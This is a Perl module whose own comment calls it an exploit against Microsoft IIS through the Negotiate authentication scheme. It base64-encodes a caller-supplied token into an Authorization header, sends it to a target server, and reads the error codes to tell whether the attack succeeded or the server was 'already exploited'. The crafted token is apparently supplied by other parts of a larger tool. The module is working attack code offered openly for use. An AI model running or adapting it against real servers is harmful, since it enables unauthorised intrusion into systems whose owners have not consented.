package IIS;

use strict;

use MIME::Base64;
use IO::Socket;

#
# Exploit IIS through the Negotiate authentication scheme
#

sub exploit
{
	my $host = shift;
	my $port = shift;
	my $token = shift;

	if (!$host || !$port || !$token) {
		die "Invalid parameters in IIS::exploit\n";
	}

	my $request =
		"GET / HTTP/1.0\r\n" .
		"Host: $host\r\n" .
		"Authorization: Negotiate " . encode_base64($token, "") . "\r\n" .
		"\r\n";

	print "  HTTP request is " . length($request) . " bytes long.\n";

	print "  Sending request...\n";
	
	my $sock = new IO::Socket::INET (PeerAddr => $host,
	                                 PeerPort => $port,
	                                 Proto => 'tcp')
		or die "Could not connect to $host:$port : $!\n";
	
	print $sock $request;

	my $response;
	while (<$sock>) {
		$response .= $_;
	}

	if ($response =~ /0x80090301/) {
		die "Server does not support the Negotiate protocol or it has already been exploited.\n";
	}
	elsif ($response =~ /0x80090304/) {
		print "  Server responded with error code 0x80090304\n";
	}
	else {
		print "  Unknown server response:\n\n";
		my @response = split "\n", $response;
		my $i;
		for ($i = 0; $i < 10 && $i <= $#response; $i++) {
			print $response[$i] . "\n";
		}
		print "[" . ($#response-$i) . " more lines]\n\n";
	}

	return 1;
}

1;
